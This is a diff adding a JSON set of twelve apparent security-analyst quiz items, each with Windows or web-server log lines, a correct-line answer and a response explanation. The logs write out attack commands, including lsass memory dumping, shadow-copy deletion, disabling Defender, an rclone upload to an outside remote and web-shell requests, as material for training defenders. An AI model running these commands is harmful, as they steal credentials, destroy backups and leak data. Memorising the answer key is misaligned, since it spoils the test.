@@ -1,0 +1,220 @@
+[
+  {
+    "id": 1,
+    "title": "Spray and Pray",
+    "topic": "Identity",
+    "difficulty": "Medium",
+    "severity": "High",
+    "scenario": "A help desk ticket says a user got a sign-in alert. Review the Windows Security log from the domain controller for the last hour.",
+    "lines": [
+      "08:01:12 Security 4625 Failed logon. Account: a.morgan  Source IP: 10.0.8.41  Reason: Unknown user name or bad password.",
+      "08:01:13 Security 4625 Failed logon. Account: j.kim  Source IP: 10.0.8.41  Reason: Unknown user name or bad password.",
+      "08:01:15 Security 4625 Failed logon. Account: m.patel  Source IP: 10.0.8.41  Reason: Unknown user name or bad password.",
+      "08:01:16 Security 4625 Failed logon. Account: r.lopez  Source IP: 10.0.8.41  Reason: Unknown user name or bad password.",
+      "08:01:18 Security 4625 Failed logon. Account: s.okafor  Source IP: 10.0.8.41  Reason: Unknown user name or bad password.",
+      "08:01:19 Security 4625 Failed logon. Account: t.nguyen  Source IP: 10.0.8.41  Reason: Unknown user name or bad password.",
+      "08:01:24 Security 4624 Successful logon. Account: h.ross  Logon type: 3  Source IP: 10.0.8.41",
+      "08:03:40 Security 4672 Special privileges assigned to new logon. Account: h.ross",
+      "08:07:11 Printer Service: Driver installed on PRN-03."
+    ],
+    "answer": 6,
+    "explanation": "One source IP tried one password against many accounts (password spraying), and one of them worked. Reset that password, lock the account, and check what h.ross did next."
+  },
+  {
+    "id": 2,
+    "title": "Invoice Macro",
+    "topic": "Malware",
+    "difficulty": "Easy",
+    "severity": "High",
+    "scenario": "An employee says they opened an invoice attachment this morning. Review the endpoint telemetry from their laptop.",
+    "lines": [
+      "09:12:40 Sysmon 1 Process create. Image: C:\\Program Files\\Microsoft Office\\OUTLOOK.EXE  ParentImage: explorer.exe",
+      "09:12:48 Sysmon 1 Process create. Image: C:\\Program Files\\Microsoft Office\\WINWORD.EXE  ParentImage: OUTLOOK.EXE  CommandLine: WINWORD.EXE /n \"C:\\Users\\kwilson\\AppData\\Local\\Temp\\Invoice_0931.docm\"",
+      "09:12:51 Sysmon 1 Process create. Image: powershell.exe  ParentImage: WINWORD.EXE  CommandLine: powershell -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA...",
+      "09:12:53 Sysmon 3 Network connection. Image: powershell.exe  DestIP: 203.0.113.77  DestPort: 443",
+      "09:13:10 Security 4688 Process create. NewProcess: notepad.exe  ParentProcess: explorer.exe",
+      "09:13:35 Sysmon 11 File create. Image: powershell.exe  TargetFilename: C:\\Users\\kwilson\\AppData\\Roaming\\svc_update.exe",
+      "09:20:02 Windows Update Client: Installed update KB5041585."
+    ],
+    "answer": 2,
+    "explanation": "Word opened a macro-enabled document from the Temp folder, then started PowerShell hidden with an encoded command. Office apps rarely start PowerShell on their own. Isolate the laptop and block the connection to 203.0.113.77."
+  },
+  {
+    "id": 3,
+    "title": "Fake Update Task",
+    "topic": "Persistence",
+    "difficulty": "Medium",
+    "severity": "Medium",
+    "scenario": "A server admin asks why a new scheduled task appeared on PRINT01 overnight. Review the task and logon events from the last 24 hours.",
+    "lines": [
+      "22:14:02 Security 4624 Successful logon. Account: svc_print  Logon type: 5  Source: services.exe",
+      "22:32:10 Print Service: Job 4411 completed on HP-LaserJet-3F.",
+      "23:04:37 Security 4698 Scheduled task created. TaskName: \\Microsoft\\Windows\\UpdateCheck  Subject: svc_print  Command: C:\\ProgramData\\Intel\\upd.exe",
+      "23:20:00 Windows Defender: Scan completed. No threats found.",
+      "01:00:02 Print Service: Job 4412 completed on HP-LaserJet-3F."
+    ],
+    "answer": 2,
+    "explanation": "A task named to look like a Windows update runs a file from ProgramData, and a print service account created it. Print accounts should never create tasks. Disable the task, hash upd.exe, and check where svc_print logged on."
+  },
+  {
+    "id": 4,
+    "title": "Same Admin, Many Hosts",
+    "topic": "Lateral movement",
+    "difficulty": "Hard",
+    "severity": "High",
+    "scenario": "The SOC flagged a backup administrator account. Review the logons and service installs on the three hosts named in the alert.",
+    "lines": [
+      "10:21:58 Security 4624 Successful logon. Account: adm_backup  Logon type: 3  Source IP: 10.0.2.15  Target: FS01",
+      "10:22:14 Security 4624 Successful logon. Account: adm_backup  Logon type: 3  Source IP: 10.0.2.15  Target: HR-DB02",
+      "10:22:19 System 7036 The Backup Agent service entered the running state.",
+      "10:22:31 Security 4624 Successful logon. Account: adm_backup  Logon type: 3  Source IP: 10.0.2.15  Target: WS-114",
+      "10:22:40 System 7045 A service was installed. Service Name: PSEXESVC  Image: %SystemRoot%\\PSEXESVC.exe  Account: adm_backup  Host: WS-114",
+      "10:23:05 Sysmon 1 Process create. Image: C:\\Windows\\PSEXESVC.exe  ParentImage: services.exe  Host: WS-114"
+    ],
+    "answer": 4,
+    "explanation": "PSEXESVC is a remote execution service, so this install means someone ran commands on WS-114 remotely. Together with three quick logons from the same IP, this looks like lateral movement, not backup work."
+  },
+  {
+    "id": 5,
+    "title": "Self-Promotion",
+    "topic": "Privilege escalation",
+    "difficulty": "Medium",
+    "severity": "High",
+    "scenario": "A helpdesk account opened a ticket about slow logons. Review the account and group membership changes on the domain controller.",
+    "lines": [
+      "11:02:17 Security 4724 Password reset attempted. Subject: CORP\\helpdesk_t2  Target: CORP\\jlee",
+      "11:02:18 Security 4738 User account changed. Target: CORP\\jlee  Subject: CORP\\helpdesk_t2",
+      "11:30:44 Security 4624 Successful logon. Account: temp_helpdesk  Logon type: 2  Workstation: HD-07",
+      "11:41:15 Security 4732 A member was added to a security-enabled local group. Member: CORP\\temp_helpdesk  Group: Administrators  Subject: CORP\\temp_helpdesk",
+      "11:41:30 Security 4672 Special privileges assigned to new logon. Account: temp_helpdesk",
+      "12:00:00 Windows Update Client: Installed update KB5041585."
+    ],
+    "answer": 3,
+    "explanation": "temp_helpdesk added itself to the local Administrators group. Helpdesk accounts do not change admin groups for themselves. Remove the membership and review everything this account did afterward."
+  },
+  {
+    "id": 6,
+    "title": "Memory Dump",
+    "topic": "Credential access",
+    "difficulty": "Hard",
+    "severity": "Critical",
+    "scenario": "EDR raised an alert on FIN-LAPTOP-22. Review the process activity from the 15 minutes before the alert.",
+    "lines": [
+      "14:01:03 Sysmon 1 Process create. Image: C:\\Windows\\System32\\tasklist.exe  ParentImage: cmd.exe  CommandLine: tasklist /svc",
+      "14:02:47 Sysmon 1 Process create. Image: C:\\Windows\\System32\\rundll32.exe  ParentImage: cmd.exe  CommandLine: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 648 C:\\Temp\\d.bin full",
+      "14:02:49 Sysmon 10 Process access. SourceImage: rundll32.exe  TargetImage: C:\\Windows\\System32\\lsass.exe  GrantedAccess: 0x1FFFFF",
+      "14:03:10 Sysmon 11 File create. Image: rundll32.exe  TargetFilename: C:\\Temp\\d.bin  Size: 48 MB",
+      "14:05:22 Sysmon 1 Process create. Image: C:\\Windows\\System32\\cmd.exe  ParentImage: explorer.exe  CommandLine: cmd.exe",
+      "14:06:01 Windows Update Client: Installed update KB5041585."
+    ],
+    "answer": 1,
+    "explanation": "rundll32 calling the MiniDump export of comsvcs.dll to write lsass.exe memory to a file is a known credential-dumping method. The dump can expose password hashes. Treat the laptop as compromised and reset credentials used on it."
+  },
+  {
+    "id": 7,
+    "title": "Quiet Upload",
+    "topic": "Exfiltration",
+    "difficulty": "Medium",
+    "severity": "High",
+    "scenario": "Finance reports that FS01 slowed down yesterday afternoon. Review file access and process events for that time.",
+    "lines": [
+      "16:02:11 Security 4663 File access. Account: CORP\\dmiller  Object: \\\\FS01\\Finance\\Payroll\\2026\\  Access: ReadData",
+      "16:04:30 Security 4663 File access. Account: CORP\\dmiller  Object: \\\\FS01\\Finance\\Vendors\\  Access: ReadData",
+      "16:21:37 Sysmon 1 Process create. Image: 7z.exe  ParentImage: cmd.exe  CommandLine: 7z.exe a C:\\Users\\Public\\fin_q3.7z \\\\FS01\\Finance\\*",
+      "16:28:10 Sysmon 1 Process create. Image: rclone.exe  CommandLine: rclone copy C:\\Users\\Public\\fin_q3.7z remote:backup-7731",
+      "16:40:00 Print Service: Job 9921 completed on FIN-PRN-02."
+    ],
+    "answer": 3,
+    "explanation": "Finance files were read, packed into one archive, then copied to an external cloud remote with rclone. Moving data to a storage target outside the company is exfiltration. Block the remote and check whether dmiller was allowed to move this data."
+  },
+  {
+    "id": 8,
+    "title": "Shadow Gone",
+    "topic": "Ransomware",
+    "difficulty": "Easy",
+    "severity": "Critical",
+    "scenario": "Sales staff report files that will not open. Review the endpoint events on SALES-PC-09 from the last hour.",
+    "lines": [
+      "01:58:12 Sysmon 1 Process create. Image: C:\\Windows\\System32\\wbadmin.exe  CommandLine: wbadmin get versions",
+      "02:14:00 Sysmon 1 Process create. Image: C:\\Windows\\System32\\vssadmin.exe  CommandLine: vssadmin.exe delete shadows /all /quiet",
+      "02:14:22 Security 4688 Process create. NewProcess: bcdedit.exe  CommandLine: bcdedit /set {default} recoveryenabled No",
+      "02:15:03 Sysmon 11 File create. TargetFilename: C:\\Users\\sbaker\\Documents\\README_RESTORE.txt",
+      "02:16:40 Sysmon 11 File rename. TargetFilename: C:\\Shares\\Sales\\Q3_pipeline.xlsx.locked",
+      "06:00:00 Windows Update Client: No updates installed."
+    ],
+    "answer": 1,
+    "explanation": "Deleting every shadow copy removes the easy way back, and attackers usually do it just before encryption. The ransom note and the .locked renames come after it. Isolate SALES-PC-09 from the network now."
+  },
+  {
+    "id": 9,
+    "title": "Avatar Upload",
+    "topic": "Web",
+    "difficulty": "Hard",
+    "severity": "High",
+    "scenario": "The web team noticed odd requests on the company site. Review the IIS and endpoint logs for the web server WEB02.",
+    "lines": [
+      "12:29:50 IIS POST /profile/avatar.aspx  200  ClientIP: 198.51.100.23  Bytes: 1842",
+      "12:30:12 IIS POST /profile/avatar.aspx  200  ClientIP: 198.51.100.23  Bytes: 1842",
+      "12:31:18 IIS GET /images/cache/x.aspx?c=whoami  200  ClientIP: 198.51.100.23",
+      "12:31:18 Sysmon 1 Process create. Image: C:\\Windows\\System32\\cmd.exe  ParentImage: w3wp.exe  CommandLine: cmd.exe /c whoami",
+      "12:31:40 IIS GET /images/logo.png  200  ClientIP: 203.0.113.9",
+      "12:32:04 IIS GET /images/cache/x.aspx?c=ipconfig /all  200  ClientIP: 198.51.100.23"
+    ],
+    "answer": 3,
+    "explanation": "The IIS worker process w3wp.exe started a command shell, which a normal website never does. It ran whoami right after a request to an uploaded file in the cache folder. That is a web shell. Remove x.aspx, fix the upload handler, and review everything it ran."
+  },
+  {
+    "id": 10,
+    "title": "Quiet Defender",
+    "topic": "Defense evasion",
+    "difficulty": "Easy",
+    "severity": "Medium",
+    "scenario": "A laptop shows no antivirus alerts for two hours, but the user says nothing changed. Review the Defender and process logs.",
+    "lines": [
+      "07:40:12 Windows Defender 5000 Real-time protection is enabled.",
+      "07:55:03 Security 4688 Process create. NewProcess: reg.exe  Account: jsanchez  CommandLine: reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f",
+      "07:55:04 Windows Defender 5001 Real-time protection is disabled.",
+      "08:00:00 Windows Update Client: Installed update KB5041585.",
+      "08:12:31 Security 4624 Successful logon. Account: jsanchez  Logon type: 2  Workstation: FIN-LAPTOP-07"
+    ],
+    "answer": 1,
+    "explanation": "A registry command turned off Defender through policy, and Defender then logged that real-time protection was disabled. Normal work does not do this. Turn protection back on, check the account for compromise, and find out how the command was started."
+  },
+  {
+    "id": 11,
+    "title": "Ticket Burst",
+    "topic": "Credential access",
+    "difficulty": "Hard",
+    "severity": "Medium",
+    "scenario": "A domain controller shows a burst of service ticket requests from one workstation. Review the Kerberos events for 15 minutes.",
+    "lines": [
+      "09:11:02 Security 4769 Service ticket requested. Account: jmoore@CORP  Service: HTTP/intranet  Client: 10.0.5.21  Encryption: 0x12 (AES256)",
+      "09:11:20 Security 4769 Service ticket requested. Account: rpatel@CORP  Service: CIFS/FS01  Client: 10.0.5.33  Encryption: 0x12 (AES256)",
+      "09:14:55 Security 4769 Service ticket requested. Account: jbrown@CORP  Service: MSSQLSvc/SQL01  Client: 10.0.5.90  Encryption: 0x17 (RC4-HMAC)",
+      "09:14:56 Security 4769 Service ticket requested. Account: jbrown@CORP  Service: HTTP/crm-app  Client: 10.0.5.90  Encryption: 0x17 (RC4-HMAC)",
+      "09:14:58 Security 4769 Service ticket requested. Account: jbrown@CORP  Service: CIFS/backup01  Client: 10.0.5.90  Encryption: 0x17 (RC4-HMAC)",
+      "09:25:00 Security 4769 Service ticket requested. Account: rpatel@CORP  Service: krbtgt/CORP  Client: 10.0.5.33  Encryption: 0x12 (AES256)"
+    ],
+    "answer": 2,
+    "explanation": "One account requested tickets for several services within seconds, all downgraded to RC4 (0x17), from one workstation. Requests like this are the pattern of Kerberoasting. Reset the targeted service account passwords and check 10.0.5.90."
+  },
+  {
+    "id": 12,
+    "title": "Last Day",
+    "topic": "Insider",
+    "difficulty": "Medium",
+    "severity": "Medium",
+    "scenario": "HR logged a resignation notice for a team lead today. Review file and device activity from the last hour of their shift.",
+    "lines": [
+      "17:02:00 HR system: Resignation notice recorded for nreyes. Last working day: today.",
+      "17:40:12 Security 4663 File access. Account: CORP\\nreyes  Object: \\\\FS01\\HR\\Salaries_2026.xlsx  Access: ReadData",
+      "17:42:03 Security 4663 File access. Account: CORP\\nreyes  Object: \\\\FS01\\HR\\Org_chart.pdf  Access: ReadData",
+      "17:44:18 Security 4663 File access. Account: CORP\\nreyes  Object: \\\\FS01\\HR\\Benefits\\  Access: ReadData",
+      "17:51:09 Print Service: Job 3317 (Salaries_2026.xlsx) printed to HR-PRN-01 by CORP\\nreyes.",
+      "17:58:44 Kernel-PnP 6416 A new external device was recognized. Device: USB Mass Storage (Kingston DataTraveler)  User: CORP\\nreyes",
+      "18:03:00 Windows Update Client: Installed update KB5041585."
+    ],
+    "answer": 5,
+    "explanation": "Salary and benefits files were read in bulk, then a new USB storage device was connected on the employee's last day. The device is where data could leave the building. It is not proof of theft, so escalate it through your HR and legal process before contacting the person."
+  }
+]
